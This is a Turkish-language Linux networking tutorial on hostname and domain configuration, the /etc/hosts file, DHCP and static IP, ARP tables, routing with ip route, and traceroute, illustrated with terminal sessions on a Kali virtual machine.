+Gördüğünüz gibi eski hostname bilgisi hala makinenin kendisini temsil eden 127.0.1.1 adresine yönlendiriliyor. Bu adresi düzeltmek için `sudo nano /etc/hosts` komutu ile dosyamızı açıp, yeni hostname bilgimizi buraya ekleyelim.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ sudo nano /etc/host
+sudo: unable to resolve host kali-makinesi: Name or service not known
+sudo: error initializing audit plugin sudoers_audit
+```
+
+Eklemek üzere dosyamızı açmak istedik fakat `sudo` komutu “kali-makinesi” hostname bilgisini tanımadığını belirterek işleme onay vermedi. İşte tam da bu sebeple ***/etc/hosts*** dosyasını düzenlememiz gerek diyoruz. Aksi halde hostname bilgisi ile işlem yapan araçlar çalışamaz hale gelecekler. Ben dosyayı düzenlemek için root kullanıcı hesabına geçiş yapıp ilgili değişimi gerçekleştireceğim. 
+
+```bash
+┌──(root㉿kali-makinesi)-[~]
+└─# nano /etc/hosts
+                                                                                                                                                            
+┌──(root㉿kali-makinesi)-[~]
+└─# exit
+```
+
+Normalde hostname değiştirilmeden önce ***/etc/hosts*** dosyasında bu değişimin belirtilmesi daha doğru bir yaklaşım olacaktır. Fakat ben önemini bizzat görmeniz için bu şekilde yanlış yoldan uygulamaya gittim. 
+
+Tamamdır artık böylelikle mevcut makinemin hostname bilgisini değiştirmiş oldum.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ cat /etc/hosts                                                                                                                                          
+127.0.0.1       localhost
+127.0.1.1       kali-makinesi
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ hostnamectl 
+ Static hostname: kali-makinesi
+       Icon name: computer-vm
+         Chassis: vm 🖴
+      Machine ID: 2f7f9cc088b74a54aaee8cfbc587c6ea
+         Boot ID: 93aec4d830474a919b87cfa774110091
+  Virtualization: oracle
+Operating System: Kali GNU/Linux Rolling
+          Kernel: Linux 5.15.0-kali3-amd64
+    Architecture: x86-64
+ Hardware Vendor: innotek GmbH
+  Hardware Model: VirtualBox
+```
+
+Konsoldaki promt alanında hala “linuxdersleri” gözüküyor fakat yeni bir konsol ya da kabuk başlattğınızda bu da değişmiş olacak. 
+
+## domainname
+
+Ağ üzerinde birden fazla sunucu mevcutsa bu sunucuları birbirinden ayırmak için hostname bilgisi kullanılıyor. hostname bilgisine ek olarak bu sunucuların aynı ağda olduğunun temsili için domain adresi de tanımlanabiliyor. Örneğin [linuxdersleri.net](http://linuxdersleri.net) adresi için kullanılan bir web sunucusunun hostname bilgisi “web” olabilir. Ayrıca varsa email sunucusu da “email” hostname ile tanımlanmış olabilir. Bu sayede linuxdersleri.net domain adresi altında hangi amaçla hangi sunucunun kullandığını, ip adreslerini hatırlamamıza gerek kalmadan takip edebiliriz. 
+
+hostname ve domain name bilgisinin bir arada bulunduğu bu tanımlamaya da **FQDN** (**f**ully **q**ualified **d**omain **n**ame) deniyor. Gösterimi de **hostname.domainname** şeklinde aralarındaki tek bir nokta ile ayrılmış isimlerden ibaret. 
+
+Ben daha açık bir örnek olması için mevcut “kali-makinesi” hostname adresine sahip cihazın domain adresi olarak linuxdersleri.net adresini almasını istiyorum. Bunun için öncelikle ***/etc/hosts*** dosyasında değişiklik yapmak üzere `sudo nano /etc/hosts` komutunu girip tam alan adını(**FQDN)** tanımlıyorum. Değişiklikleri `cat` komutu ile teyit edebiliriz. 
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali-makinesi.linuxdersleri.net
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Şimdi sistem üzerindeki hostname ve domainame bilgisini tanımlamak üzere `hostnamectl hostname kali-makinesi.linuxdersleri.net` şeklinde komutumu giriyorum.
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ hostnamectl hostname kali-makinesi.linuxdersleri.net
+
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ hostnamectl 
+ Static hostname: kali-makinesi.linuxdersleri.net
+       Icon name: computer-vm
+         Chassis: vm 🖴                                                                                                                                     
+      Machine ID: 2f7f9cc088b74a54aaee8cfbc587c6ea                                                                                                         
+         Boot ID: 2c2115508125496eaa8692e6325cf58a                                                                                                         
+  Virtualization: oracle                                                                                                                                   
+Operating System: Kali GNU/Linux Rolling                                                                                                                   
+          Kernel: Linux 5.15.0-kali3-amd64                                                                                                                 
+    Architecture: x86-64                                                                                                                                   
+ Hardware Vendor: innotek GmbH                                                                                                                             
+  Hardware Model: VirtualBox
+```
+
+Gördüğünüz gibi hostname bilgisi değiştirilmiş oldu. İlk noktadan önceki kısım hostname, daha sonrası domain name olarak geçiyor. Dilerseniz, `dnsdomainname` komutu ile bu durumu kendiniz de teyit edebilirsiniz. 
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ dnsdomainname                                                                                                                                          
+linuxdersleri.net
+```
+
+Böylelikle lokal ağdaki hostname “kali-makinesi” olurken, domain bilgisi de “linuxdersleri.net” oldu. Eğer lokal ağımda birden fazla sunucu varsa her birine benzer şekilde aynı domain bilgisine ek olarak özel bir hostname tanımlayabilirim. Bu sayede DNS sunucusu da bu adresleri tanıyorsa, ilgili ip adresini bilmeme gerek kalmadan ilgili sunucuyu bulabilirim. 
+
+![hostname-domainname.webp]({{ site.url }}/egitim/temel-linux/network/hostname-domainname.webp){:class="responsive img-zoomable"}
+
+Yani tıpkı bizim websitelerini ziyaret etmek için DNS yardımıyla, domain adresini ip adresine dönüştürüyor olmamız gibidir. Fakat bu işlem lokal ağdaki cihazları birbirinden ayırt etmek ve isimleri üzerinden kolayca onlara ulaşabilmek için kullanılıyor. Örneğin yukarıdaki gibi bir ağda, kali-makinem isimli host, mail hostu ile iletişime geçmek istediğinde [mail.linuxdersleri.net](http://mail.linuxdersleri.net) adresinin ip adresini ağdaki DNS sunucusuna sorar. 
+
+![DNS-request.webp]({{ site.url }}/egitim/temel-linux/network/DNS-request.webp){:class="responsive img-zoomable"}
+
+DNS sunucusu ise, eğer bu adres kendi tablosunda kayıtlı ile ilgili ip adresini yanıt olarak gönderir.
+
+![DNS-response.webp]({{ site.url }}/egitim/temel-linux/network/DNS-response.webp){:class="responsive img-zoomable"}
+
+Bu sayede doğrudan ip adresini bilmemize gerek kalmadan lokal ağdaki tüm hostlar ile, hostname bilgisi üzerinden iletişim kurabiliriz.
+
+Bu yaklaşımın kullanılabilmesi için elbette lokal ağdaki cihazların ortak olarak aynı DNS hizmetini kullanıyor olması ve bu DNS hizmetinin de bu hostname ve ip adreslerini biliyor olması gerek. Bunun için dilerseniz routerınız üzerinden konfigürasyon tanımlayabilir ya da DNS için harici olarak bir sunucu kurabilirsiniz. Bu sayede bu DNS hizmetine sorgu yollayan tüm lokal ağdaki cihazlar, birbirilerinin ip ve hostname bilgilerine de kolayca erişmiş olur. Hatta eğer birbirine bağlı birden fazla ağ bulunuyorsa bu ağlardaki cihazlar ile iletişime geçmek üzere de benzer yaklaşım kullanılır. 
+
+![DNS-multi-network.webp]({{ site.url }}/egitim/temel-linux/network/DNS-multi-network.webp){:class="responsive img-zoomable"}
+
+İşte hostname sayesinde ağ içindeki cihazları birbirinden ayırmak mümkün iken, domain sayesinde de gerektiğinde ağları birbirinden ayırt etmemiz mümkün oluyor. Bu sayede ip adreslerini doğrudan bilmeye gerek kalmadan kısayoldan ilgili cihazı ayırt etmemiz mümkün oluyor.
+
+Biz bu temel eğitimde DNS sunucusunun nasıl kurulacağını ele almayacağız. Çünkü bu eğitimin amacı herkes için temel Linux bilgisi sağlamak. Fakat merak ediyorsanız kısa bir araştırma ile öğrenebilirsiniz. Burada önemli olan hostname ve domain bilgisinin neden kullanıldığını anlayabilmek. 
+
+## /etc/hosts
+
+***/etc/hosts*** , sistemimizdeki lokal DNS görevini üstlenen bir konfigürasyon dosyasıdır. hostname değişimi sırasında bu dosyadan bahsetmiştik. Şimdi ayrıca ele alarak biraz daha anlamlı hale getirebiliriz. 
+
+***/etc/hosts*** dosyasının temel amacı, IP adreslerini doğrudan host isimleriyle eşleştirmektir. Bu sayede harici bir DNS sorgusuna gerek kalmadan yerel olarak IP çözümlemesi sağlanabilir. Bu yaklaşım, özellikle ağdaki cihazlar arasındaki iletişimde veya belirli servislere erişimde IP adreslerini belirlemek amacıyla kullanılabiliyor. Örneğin lokal ağımızdaki hostların isimleri ile ip adreslerini bu listeleye ekleyerek, yalnızca hostname bilgileri sayesinde ilgili hostlar ile kolayca iletişim kurabiliriz. 
+
+Ben denemek için lokal ağımdaki Windows ve Rocky Linux sistemlerinin ip adreslerinin hostname bilgisini, `nano` yardımıyla ***/etc/hosts*** dosyasına ekliyorum.
+
+```bash
+GNU nano 6.0                                           /etc/hosts *                                                  
+127.0.0.1       localhost
+127.0.1.1       kali-makinesi.linuxdersleri.net
+192.168.1.2     windows
+192.168.1.12    rocky-linux
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Şimdi değişimi test etmek için örneğin hostname bilgisi üzerinden ilgili hostlara `ping` ile kontrol paketleri gönderebiliriz.
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ping windows                                                                                                       
+PING windows (192.168.1.2) 56(84) bytes of data.
+64 bytes from windows (192.168.1.2): icmp_seq=1 ttl=128 time=0.478 ms
+64 bytes from windows (192.168.1.2): icmp_seq=2 ttl=128 time=0.518 ms
+64 bytes from windows (192.168.1.2): icmp_seq=3 ttl=128 time=0.486 ms
+^C
+--- windows ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2054ms
+rtt min/avg/max/mdev = 0.478/0.494/0.518/0.017 ms
+
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ping rocky-linux                                                                                                   
+PING rocky-linux (192.168.1.12) 56(84) bytes of data.
+64 bytes from rocky-linux (192.168.1.12): icmp_seq=1 ttl=64 time=2.72 ms
+64 bytes from rocky-linux (192.168.1.12): icmp_seq=2 ttl=64 time=0.967 ms
+64 bytes from rocky-linux (192.168.1.12): icmp_seq=3 ttl=64 time=0.831 ms
+^C
+--- rocky-linux ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2026ms
+rtt min/avg/max/mdev = 0.831/1.506/2.722/0.861 ms
+```
+
+Gördüğünüz gibi ***/etc/hosts*** dosyasına eklemiş olduğum “hostname ip” eşleşmesi sayesinde, ben hostname yazdığımda bu hostname ip adresine çözümlenip ilgili ip adresi üzerinden işlem gerçekleştiriliyor. 
+
+Yani harici olarak DNS hizmetine sorulmadan önce sistem kendi içinde bu sorguyu gerçekleştirildiği için, lokal olarak dilediğim ip için dilediğim hostname veya domain bilgisi ekleyebiliyorum. 
+
+Örneğin spesifik domain veya hostname adresini engellemek istersem bu dosya üzerinden geçersiz bir ip adresi ile tanımlayabilirim. Ben denemek için google.com adresini 127.0.0.1 adresi ile eşleştiriyorum. 
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ cat /etc/hosts                                                                                                     
+127.0.0.1       localhost
+127.0.1.1       kali-makinesi.linuxdersleri.net
+192.168.1.2     windows
+192.168.1.12    rocky-linux
+127.0.0.1       google.com
+```
+
+Bu sayede ben google.com domain bilgisini talep ettiğimde bana 127.0.0.1 adresi döndürüleceği için bu domainin arkasındaki gerçek ip ile iletişime geçemeyeceğim. Dolayısıyla ilgili domain adresinin çözümlenmesini de engellemiş olacağım. Bu noktada kullanıcı yalnızca doğrudan ilgili domain arkasındaki ip adresini tam olarak girerek iletişim kurabilir.
+
+Denemek için google.com adresine ping gönderelim.
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ping google.com
+PING google.com (127.0.0.1) 56(84) bytes of data.
+64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.018 ms
+64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.031 ms
+^C
+--- google.com ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1012ms
+rtt min/avg/max/mdev = 0.018/0.024/0.031/0.006 ms
+```
+
+Gördüğünüz gibi google.com adresi, localhost adresi olan 127.0.0.1 adresine işaret ediyor. Dolayısıyla gerçek adres ile iletişim kuramıyorum. 
+
+Yani neticede ***/etc/hosts*** dosyası lokal DNS görevi gören bir konfigürasyon dosyasıdır. Harici DNS hizmetine gidilmeden önce her seferinde işletim sistemi tarafından ilk olarak bu dosya kontrol edildiği için işletim sistemi bazında domain veya hostname çözümlemeleri tanımlamak için bu dosya kullanılabiliyor. 
+
+# DHCP Hakkında
+
+DHCP hizmetinin, ağdaki tüm cihazlara gerekli olan “ip”, “subnet”, “getway”, “dns” bilgisini otomatik olarak sunduğunu biliyorsunuz. Bu sayede client cihazlara tek tek tanımlamakla uğraşmadan ağ içindeki iletişimi sorunsuz hale getirebiliyoruz. Fakat her zaman otomatik tanımlama yapılmasını istemeyeceğimiz durumlar olabilir. Örneğin sunucuların sabit ip adreslerine sahip olmasını da isteyebiliriz. Biz aksini belirtmediğimiz sürece “default getway” yani “varsayılan ağ geçidi” olarak kullanılan router aslında **DHCP** görevini üstelenerek ağdaki cihazlara benzersiz ip tanımlamaları yapıyor. Bu durumu teyit etmek için `ip route` komutunu girebiliriz.
+
+![DHCP.webp]({{ site.url }}/egitim/temel-linux/network/DHCP.webp){:class="responsive img-zoomable"}
+
+Gördüğünüz gibi **eth0** arayüzü için “**default getway**” olarak tanımlı olan “**192.168.1.1**” adresi aynı zamanda “**dhcp**” olarak kullanılıyormuş. Yani eth0 arayüzünün dhcp üzerinden dinamik(dynamic) olarak değişken ip adresleri aldığını öğrenmiş olduk.
+
+Eğer ip adresinin değişken olmasını istemiyorsak, `nmtui` üzerinden “automatic” seçeneğini devredışı bırakıp manuel olarak kendimiz sabit bir ip adresi tanımlayabiliriz. Tek yapmanız gereken, statik ip adresi tanımlamak istediğiniz ağ arayüzünü seçip, dhcp yerine elle ip tanımlaması yapmak. Daha önce ele aldığımız için ben hızlıca gif resmi üzerinden adımları gösteriyorum.
+
+![static-ip.gif]({{ site.url }}/egitim/temel-linux/network/static-ip.gif){:class="responsive img-zoomable"}
+
+![static-ip.webp]({{ site.url }}/egitim/temel-linux/network/static-ip.webp){:class="responsive img-zoomable"}
+
+Gördüğünüz gibi `ip r` komutunu çıktısında da ip adresinin “static” yani “sabit” olarak eklenmiş olduğu açıkça belirtiliyor. Bu şekilde statik ip tanımlamasını kolayca gerçekleştirebiliyoruz. 
+
+Fakat tabii ki dhcp yerine elle tanımlama yaptığınızda ip çakışması gibi yanlış konfigürasyonların sebep olabileceği sorunlar ile karşılaşmanız da olası. Bu sebeple static yani sabit ip adresini yalnızca gerekli durumlarda uygulamanız tavsiye edilir. Örneğin client yerine genellikle ip adresinin sabit olması gereken server cihazlarında ip sabitlemesi yapılır. Bu sayede bu server ile iletişime geçmek isteyen tüm yapılar değişmeyen tek bir ip adresi sayesine zahmetsizce iletişim kurabilir. 
+
+Bunun dışında default getway üzerinden dhcp hizmeti almak istemiyorsanız, harici olarak dhcp sunucusu kurup bu sunucunun ağdaki tüm cihazlara ip tanımlaması yapmasını da sağlayabilirsiniz. Bu sayede geniş ağlarda merkezi bir dhcp yönetimi mümkün oluyor. DHCP sunucusu üzerinden, hostların MAC adresi ile ip sabitlemesi gibi çeşitli işlemler de yapılabildiği için karmaşık ağlarda ağ yönetimini kolaylaştırmak adına harici DHCP sunucusu tercih edilebiliyor. 
+
+## arp
+
+Ağ üzerindeki hostların, iletişime geçtiği hostların IP-MAC bilgisini kendi arp tablolarında tuttuğunu biliyorsunuzdur. Linux üzerinde, mevcut makinenin arp tablosunu görmek için `arp` komutunu girmemiz yeterli oluyor.
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ arp
+
+┌──(taylan㉿kali-makinesi)-[~]
+└─$
+```
+
+Eğer daha önce herhangi bir host ile iletişim kurmamış bir cihaz üzerinden bu komutu girecek olursanız, bende olduğu şekilde arp tablosu boş olacaktır. Bu tablonun, hostlar ile iletişim kurdukça dolduğunu teyit etmek için ağımızdaki bir hosta `ping` ile icmp paketi yollayabiliriz. Ben “192.168.1.2” ip adresine sahip olduğunu bildiğim Windows makinesine `ping -c 3 192.168.1.2` komutu ile 3 paket gönderiyorum.
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ping -c 3 192.168.1.2
+PING 192.168.1.2 (192.168.1.2) 56(84) bytes of data.
+64 bytes from 192.168.1.2: icmp_seq=1 ttl=128 time=1.41 ms
+64 bytes from 192.168.1.2: icmp_seq=2 ttl=128 time=0.858 ms
+64 bytes from 192.168.1.2: icmp_seq=3 ttl=128 time=0.606 ms
+
+--- 192.168.1.2 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2012ms
+rtt min/avg/max/mdev = 0.606/0.956/1.406/0.333 ms
+
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ arp
+Address                  HWtype  HWaddress           Flags Mask            Iface
+192.168.1.2              ether   4c:cc:6a:4a:58:f6   C                     eth0
+```
+
+Gördüğünüz gibi Windows makinesi ile aramda sorunuzca paket alışverişi gerçekleştirildiği için Windows hostunun IP ve MAC bilgisi de alınıp ARP tablosuna eklenmiş. Zaten arp tablosu da bu amaçla kullanılıyor. Zaman içinde biz iletişim kurdukça ARP protokolü sayesinde taraflar arasında IP-MAC adresi paylaşımı yapılıyor ve taraflar da kendi ARP tablolarında bu bilgileri tutuyorlar. 
+
+Bu çıktılara dikkat edecek olursanız router cihazının ip adresi arp tablosunda bulunmuyor. Çünkü biz lokal ağda iletişim kurarken, modemimizin switch özelliği sayesinde bu paketleri hedeflerine ulaştırıyoruz. Router özelliği, harici ağlara paket yönlendirmek istediğimizde kullanılıyor. Bu durumu teyit etmek için “1.1.1.1” adresine yani lokal ağımız dışındaki internet üzerinde yer alan public bir ip adresine ping gönderelim ve arp tablosunu tekrar kontrol edelim.
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ping 1.1.1.1
+PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
+64 bytes from 1.1.1.1: icmp_seq=1 ttl=56 time=9.64 ms
+64 bytes from 1.1.1.1: icmp_seq=2 ttl=56 time=7.69 ms
+64 bytes from 1.1.1.1: icmp_seq=3 ttl=56 time=8.25 ms
+64 bytes from 1.1.1.1: icmp_seq=4 ttl=56 time=8.50 ms
+^C
+--- 1.1.1.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3131ms
+rtt min/avg/max/mdev = 7.687/8.519/9.640/0.710 ms
+
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ arp
+Address                  HWtype  HWaddress           Flags Mask            Iface
+192.168.1.1              ether   c8:3a:35:7d:46:18   C                     eth0
+192.168.1.2              ether   4c:cc:6a:4a:58:f6   C                     eth0
+```
+
+Bakın bu kez hedef dış ağdaki bir adres olduğu için, router ile bu paketin bu ağa yönlendirilmesi gerekiyor. Bu sebeple bu paket router cihazına teslim ediliyor. Bu teslim sırasında router cihazı ile benim aramda ARP protokolü ile IP-MAC adresi paylaşımı gerçekleşiyor. Bu sebeple benim arp tabloma router cihazının ip adresi ve MAC adresi ekleniyor. 
+
+Lokal ağdayken modemimizin switch özelliği sayesinde paketler “fiziksel port-MAC”adresi bilgisiyle iletiliyor. Dolayısıyla router ile işimiz olmuyor. Fakat söz konusu harici bir ağa paket iletmek olduğunda, router “yönlendirici” görevinde olduğu için router cihazının IP ve MAC bilgisine ihtiyacımız oluyor. 
+
+Eğer buradaki anlatımlar yeterince açık değilse, ağ temellerini ele aldığımız eğitimi tamamlayıp tekrar döndüğünüzde daha anlamlı hale gelebilir. 
+
+Ayrıca arp tablosu mevcut ağ arayüzüne(network interface) özel olarak tutuluyor. Dolayısıyla bir ağ arayüzü kapatıldığında veya farklı bir ağ arayüzü kullanıldığında bu arp tablosu da sıfırlanmış oluyor. Ben denemek için eth0 arayüzünü kapatıp tekrar açacağım ve arp tablosunu tekrar kontrol edeceğim.
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ arp
+Address                  HWtype  HWaddress           Flags Mask            Iface
+192.168.1.1              ether   c8:3a:35:7d:46:18   C                     eth0
+192.168.1.2              ether   4c:cc:6a:4a:58:f6   C                     eth0
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ sudo ip link set eth0 down
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ sudo ip link set eth0 up
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ arp
+┌──(taylan㉿kali-makinesi)-[~]
+└─$
+```
+
+Gördüğünüz gibi eth0 arayüzünü kapatıp tekrar açtığımda arp tablosu da sıfırlanmış oldu. Benzer şekilde örneğin ben Wi-Fi bağlantısı gerçekleştirecek olursam, bu kez Wi-Fi arayüzü için ayrı bir arp tablosu tutuluyor olacak. 
+
+## route
+
+Mevcut ağ arayüzünün, dış ağlar ile iletişim kurmak üzere kullandığı routerın bilgisini “default getway” adresi üzerinden öğrenebiliyoruz. Bunun için `ip r` komutunu girmemiz yeterli.
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ip r                                                                                                               
+default via 192.168.1.1 dev eth0 proto static metric 100 
+192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.15 metric 100
+```
+
+Doğrudan yönlendirme tablosunu görmek istersek `route` komutunu da kullanabiliyoruz. 
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ route                                                                                                                                                
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         192.168.1.1     0.0.0.0         UG    100    0        0 eth0
+192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0
+```
+
+Burada varsayılan ağ geçici(default getway) 192.168.1.1 olarak gözüküyor. Yani bir paket harici bir ağa gönderilecekse bu adrese teslim ediliyor. İsim çözümlemesi yapmadan yalnızca sayısal verileri görmek için `route -n` komutunu girelim. 
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ route -n
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0
+192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0
+```
+
+Bakın bu kez ilk satırda “Destination” yani hedef olarak “**0.0.0.0**” adresi yazıyor. Genmask değeri de ağın büyüklüğünün herhangi bir değer olabileceğini belirten “**0.0.0.0**” subnetmask değeri aslında. Bunun anlamı, hedefi herhangi bir ağ olan tüm istekleri getway olan “192.168.1.1” adresine yönlendirilecek olduğu. Bu sayede internet üzerindeki herhangi bir ip adresi ile iletişim kurmak istediğimizde ilgili paket, “default getway” adresindeki cihaza teslim ediliyor. Bu cihaz da router aygıtımız olduğu için bu aygıt ilgili paketin hedef ulaşabilmesi için gerekli yönlendirmenin yapılmasını sağlıyor.
+
+İkinci satırda ise “Destination” yani hedef olarak “192.168.1.0” adresi yazıyor. Genmask adresi ise “255.255.255.0” yani bu bilgiler ışığında **tam olarak “192.168.1.0”** ağı içindeki ip adreslerinin hedeflendiği durumlar kapsanmış oluyor. Gateway adresindeki “**0.0.0.0**” değeri ise bu ağa erişim için bir ağ geçidi kullanılmasına gerek olmadığını belirtiyor. Dolayısıyla 192.168.1.0 ağı içindeki ip adresleri, birbiri ile iletişim kurarlarken default getway adresindeki router cihazına veri göndermeleri gerekmiyor. Bu sebeple biz lokal ağımızdaki bir hosta veri gönderirken, bu veri paketi router cihazına uğramadan-switch vasıtası ile-ilgili host cihazına teslim ediliyor.
+
+Eğer temel ağ eğitimine katıldıysanız, orada benzeri durumdan bahsetmiştik. İnternet gibi geniş bir ip aralığını temsil etmek üzere “**0.0.0.0/0**” adresi tanımlanıyordu. Ayrıca lokal ağdaki iletişim için de ayrıca lokal ağ adresi belirtiliyordu. Bu sayede ip adresi lokal ağdaki bir adres ise, ilgili paket doğrudan lokal ağdaki hosta iletiliyorken, lokal ağında dışındaki adreslerin hepsi default getway olarak bilinen yönlendirici router cihazına iletiliyordu. 
+
+Mevcut cihazımızdaki routing table bilgisini `route` aracı üzerinden düzenlememiz mümkün. Fakat günümüzde yönlendirme tablosunu düzenlemek için `ip` aracı daha sık kullanılıyor. Örneğin ben 10.0.0.0/24 ağındaki ip adresleri hedeflendiğinde, verilerin 192.168.1.2 adresine yönlendirilmesini istiyorum. Bunun için `sudo ip route add 10.0.0.0/24 via 192.168.1.2` komutunu girmem yeterli.
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ sudo ip route add 10.0.0.0/24 via 192.168.1.2                                                                                                          
+[sudo] password for taylan: 
+
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ route -n                                                                                                                                               
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0
+10.0.0.0        192.168.1.2     255.255.255.0   UG    0      0        0 eth0
+192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0
+```
+
+Gördüğünüz gibi "10.0.0.0” ağındaki herhangi bir ip adresinin hedeflendiği durumda, bu veriler “192.168.1.2” adresine yönlendiriliyor olacak. Bu adreste de muhtemelen bir router olacağı için bu router konfigüre edildiği şekilde bu paketlerin uygun yerlere ulaşmasını sağlayacak. Bu yaklaşım sayesinde özellikle birden fazla şirket ağının olduğu işletmelerde, hangi ağdaki cihazların hangi ağlara veya hostlara erişebileceğini yönetmek mümkün oluyor.
+
+Eğer bu tanımlamayı silmek isterseniz “`add`” yerine “`del`” seçeneğini aynı şekilde belirtmeniz yeterli.
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ sudo ip route del 10.0.0.0/24 via 192.168.1.2                                                                                                          
+
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ route -n                                                                                                                                               
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0
+192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0
+```
+
+Elbette bu değişimleri ip aracı üzerinden gerçekleştirdiğimiz için kalıcı değiller. Kalıcı olmasını istiyorsanız, sistem başlangıcında çalışacak bir servis tanımlayabilir ya da `nmtui` aracı üzerinden yönlendirme ekleyebilirsiniz. `nmtui` üzerinden yönlendirmeye dair örnek için aşağıdaki görsellere bakabilirsiniz.
+
+![nmtui-routing-table.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-routing-table.webp){:class="responsive img-zoomable"}
+
+![nmtui-routing-table-add.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-routing-table-add.webp){:class="responsive img-zoomable"}
+
+Anlatım sırasında bahsetmiş olduğumuz lokal ve harici ağlardaki yönlendirme durumu bizzat teyit etmek üzere `traceroute` aracı yardımıyla yönlendirme adımlarını takip edebiliriz. 
+
+## traceroute
+
+Paketlerin ağdaki yönlendirilme yolculuğunu takip etmek için `traceroute` aracı ile icmp paketi yollayabiliyoruz. Ben denemek için dış ağdaki “**8.8.8.8**” adresine giden yönlendirme yolcuğunu test etmek istiyorum.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ traceroute 8.8.8.8                                                                                                                                      
+traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets
+ 1  Tenda.Home (192.168.1.1)  8.050 ms  7.560 ms  7.497 ms
+ 2  172.17.1.81 (172.17.1.81)  7.485 ms  12.420 ms  12.383 ms
+ 3  69.125.223.31.srv.turk.net (31.223.125.69)  12.289 ms  12.231 ms  12.149 ms
+ 4  70.125.223.31.srv.turk.net (31.223.125.70)  12.124 ms  12.116 ms  12.081 ms
+ 5  73.125.223.31.srv.turk.net (31.223.125.73)  12.163 ms  12.126 ms  12.046 ms
+ 6  77.100.146.159.srv.turk.net (159.146.100.77)  22.134 ms  18.165 ms  17.565 ms
+ 7  72.14.210.191 (72.14.210.191)  16.364 ms  16.167 ms  17.343 ms
+ 8  72.14.210.190 (72.14.210.190)  17.182 ms  16.920 ms  16.747 ms
+ 9  * * *
+10  dns.google (8.8.8.8)  16.045 ms  16.473 ms  16.853 ms
+```
+
+Gördüğünüz gibi adım adım yönlendirmeler hakkında bilgi sunulmuş oldu. Çıktılarda yer alan “* * *” çıktısı bu yönlendiricinin icmp paketlerine yanıt vermeyecek şekilde konfigüre edildiği veya bu yönlendiricinin hizmet vermediği anlamına geliyor olabilir. 
+
+Çıktılara dikkat edecek olursanız ben dış ağdaki bir hedefe paket gönderdiğim için, paket ilk olarak varsayılan ağ geçidim olan 192.168.1.1 adresine uğrayıp oradan internet servis sağlayıcımın yönlendiricilerine uğrayıp hedefe doğru yönlendiriliyor. Çünkü bilgisayarımdaki routing table üzerinde dış ip adreslerine gönderilen verilerin “192.168.1.1” adresine yönlendirilmesi gerektiği belirtiliyor. 
+
+Paket lokal ağdaki bir ip adresine gönderilecek olsaydı, 192.168.1.1 adresindeki default getway görevini gerçekleştiren routera uğramayacaktı.
+
+Bu durumu teyit etmek için lokal ağımızdaki bir hosta gönderdiğimiz paketi de takip edebiliriz. 
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ traceroute 192.168.1.12                                                                                                                                
+traceroute to 192.168.1.12 (192.168.1.12), 30 hops max, 60 byte packets
+ 1  rocky-linux (192.168.1.12)  3.128 ms !X  2.008 ms !X  1.989 ms !X
+```
+
